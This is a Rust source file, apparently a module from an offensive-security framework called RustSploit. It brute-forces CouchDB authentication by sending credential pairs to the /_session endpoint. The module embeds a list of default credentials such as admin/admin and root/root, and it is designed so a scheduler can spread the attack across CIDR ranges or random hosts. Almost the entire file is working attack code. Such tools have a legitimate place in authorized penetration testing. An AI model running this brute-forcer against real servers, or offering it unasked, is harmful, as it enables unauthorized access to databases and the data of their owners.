//! CouchDB credential brute-force via POST /_session.

use anyhow::{Context, Result};
use crate::module::{ModuleCtx, ModuleOutcome};
use std::time::Duration;

use crate::module_info::{ModuleInfo, ModuleRank};
use crate::utils::creds_helper::{self, CredsRun};
use crate::utils::LoginResult;

const DEFAULT_PORT: u16 = 5984;

const DEFAULTS: &[(&str, &str)] = &[
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "couchdb"),
    ("admin", ""),
    ("root", "root"),
];

pub fn info() -> ModuleInfo {
    ModuleInfo {
        name: "CouchDB Bruteforce".to_string(),
        description:
            "Tests CouchDB authentication via POST /_session. Single-target — scheduler does \
             CIDR / random / file fan-out."
                .to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![
            "https://docs.couchdb.org/en/stable/api/server/authn.html".to_string(),
        ],
        disclosure_date: None,
        rank: ModuleRank::Normal,
        default_port: Some(5984),
    }
}

pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
    let target = ctx.target.as_single().context("couchdb_bruteforce requires a single-host target")?;
    creds_helper::run(
        target,
        CredsRun {
            service_name: "couchdb",
            default_port: DEFAULT_PORT,
            source_module: "creds/generic/couchdb_bruteforce",
            defaults: DEFAULTS,
            password_only: false,
        },
        |host, port, user, pass, timeout| async move { probe(&host, port, &user, &pass, timeout).await },
    )
    .await
}

async fn probe(host: &str, port: u16, user: &str, pass: &str, timeout: Duration) -> LoginResult {
    let client = match crate::utils::build_http_client(timeout) {
        Ok(c) => c,
        Err(e) => {
            return LoginResult::Error {
                message: format!("http client: {e}"),
                retryable: false,
            }
        }
    };
    let url = format!("http://{}:{}/_session", host, port);
    let body = format!(
        "name={}&password={}",
        crate::utils::url_encode(user),
        crate::utils::url_encode(pass)
    );
    let resp = client
        .post(&url)
        .header("Content-Type", "application/x-www-form-urlencoded")
        .body(body)
        .send()
        .await;
    let resp = match resp {
        Ok(r) => r,
        Err(e) => {
            return LoginResult::Error {
                message: format!("post: {e}"),
                retryable: e.is_timeout() || e.is_connect(),
            }
        }
    };
    let status = resp.status().as_u16();
    match status {
        200 => {
            // CouchDB POST /_session returns 200 + {"ok":true,...} on a real login.
            // Require the body to confirm it, so a non-CouchDB service (or an HTML
            // page) that answers 200 isn't recorded as a valid credential.
            match resp.text().await {
                Ok(body) if body.contains("\"ok\":true") => LoginResult::Success,
                Ok(_) => LoginResult::AuthFailed,
                Err(e) => LoginResult::Error {
                    message: format!("body: {e}"),
                    retryable: e.is_timeout(),
                },
            }
        }
        401 | 403 => LoginResult::AuthFailed,
        429 | 500..=599 => LoginResult::Error {
            message: format!("transient status {status}"),
            retryable: true,
        },
        other => LoginResult::Error {
            message: format!("unexpected status {other}"),
            retryable: false,
        },
    }
}

crate::register_native_module!(crate::module::Category::Creds, "generic/couchdb_bruteforce", native);
